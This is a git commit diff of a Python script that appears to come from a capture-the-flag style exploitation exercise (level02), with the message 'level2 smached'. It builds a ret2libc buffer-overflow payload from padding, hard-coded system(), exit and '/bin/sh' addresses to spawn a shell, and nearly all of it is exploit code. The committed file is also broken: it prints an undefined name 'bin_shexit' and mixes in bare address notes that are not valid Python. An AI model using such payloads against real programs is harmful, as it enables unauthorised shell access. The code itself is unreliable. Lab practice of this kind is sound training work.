06fa70ef85e3cf5a30562e3d94ada9e217808ff7
Azeddine El makkaoui <ael-makk@e3r1p13.1337.ma>
2022-09-07 21:04:30 +0100

    level2 smached

--- level02/script.py
+++ level02/script.py
@@ -1,16 +1,21 @@
 import struct
-padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
+padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
+nop = struct.pack("I", 0x0804853e)
 system = struct.pack("I", 0xb7e6b060)
-return_after_system = "AAAA"
+return_after_system = struct.pack("I", 0xb7e5ebe0)
 bin_sh = struct.pack("I", 0xb7f8cc58)
-print padding + system + return_after_system + bin_sh
+print padding + nop + system + return_after_system + bin_shexit
+
 
 
 
 struct.pack("I", 0xb7e6b060)
 
-bin sh addr = 0xbffff6f8
+bin/sh addr = 0xbffff6f8
 
-system addr = 0xb7e6b060
+function system addr : 0xb7e6b060 
 
-0xb7e6b060
+function p return : 0x0804853e
+import struct 
+padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV"
+print padding
